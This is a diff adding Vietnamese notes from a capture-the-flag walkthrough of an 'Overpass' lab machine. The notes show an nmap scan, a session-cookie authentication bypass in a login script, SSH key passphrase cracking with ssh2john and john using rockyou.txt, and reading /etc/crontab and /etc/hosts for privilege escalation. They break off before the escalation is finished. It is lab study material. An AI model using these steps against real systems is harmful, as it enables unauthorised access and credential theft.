@@ -1,0 +1,54 @@
+step 1 : quét nmap 
+sudo nmap -sC -O -A 10.10.212.0 
+có 2 port là 22 ssh và 80 tcp open http
+step 2 : check port 80
+ctrl + U tìm ra đc 1 user tên là james
+dirseach tìm được path /admin 
+check login.js:
+async function login() {
+    const usernameBox = document.querySelector("#username");
+    const passwordBox = document.querySelector("#password");
+    const loginStatus = document.querySelector("#loginStatus");
+    loginStatus.textContent = ""
+    const creds = { username: usernameBox.value, password: passwordBox.value }
+    const response = await postData("/api/login", creds)
+    const statusOrCookie = await response.text()
+    if (statusOrCookie === "Incorrect credentials") {
+        loginStatus.textContent = "Incorrect Credentials"
+        passwordBox.value=""
+    } else {
+        Cookies.set("SessionToken",statusOrCookie)
+        window.location = "/admin"
+    }
+
+bypass cái này ở chỗ cookie khi mà post requests lên sai thì nó sẽ gán cookie thành Incorrect credentials
+=> chuyển cookie tên là SesionToken thành 1 giá trị khác sẽ bypass đc
+sau khi bypass xong sẽ có khóa private rsa
+kết nối rsa bằng file private key :
+ssh -i id_rsa james@10.10.212.0
+cần 1 pasphrase để có thể kết nối 
+=> sẽ decrypt cái id_rsa
+command : 
+python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
+để biến nó thành định dạng file hash
+john --wordlist=../../../../usr/share/wordlists/rockyou.txt id_rsa.hash
+dùng thư viện rockyou.txt để bruteforce key ( chú ý mình dùng kali)
+tìm đc key là james13
+
+step 3 : exploit 
+cat user.txt => flag1
+step 4 : vượt quyền:
+cat todo.txt :
+To Do:
+> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
+> Write down my password somewhere on a sticky note so that I don't forget it.
+  Wait, we make a password manager. Why don't I just use that?
+> Test Overpass for macOS, it builds fine but I'm not sure it actually works
+> Ask Paradox how he got the automated build script working and where the builds go.
+  They're not updating on the website
+cat /etc/crontab 
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+cat /etc/hosts
+
